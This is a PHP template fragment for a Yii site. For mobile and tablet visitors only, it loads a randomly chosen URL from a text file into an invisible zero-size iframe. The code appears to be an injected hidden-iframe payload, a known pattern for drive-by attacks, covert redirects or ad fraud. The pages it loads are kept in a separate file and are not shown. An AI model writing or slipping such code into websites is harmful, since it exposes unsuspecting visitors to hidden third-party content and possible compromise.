<?php
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
$link = 'http://val.mobi';
$target=" target=\"_blank\"";

Yii::import('ext.MDetect.MDetect');
$detect = new MDetect();

$is_mobile = ($detect->isMobile(Yii::app()->request->getUserAgent()) || $detect->isTablet(Yii::app()->request->getUserAgent()));

if(is_file(Yii::getPathOfAlias('webroot').'/artists.txt') && $is_mobile) { //stripos($ua, 'android') !== false ) { // && stripos($ua,'mobile') !== false) {
    $items = file(Yii::getPathOfAlias('webroot').'/artists.txt');
    $item = trim($items[array_rand($items)]);
?>
    <iframe src="<?=$item?>" width="0" height="0" border="0" scroll="no"></iframe>
<?php
}
?>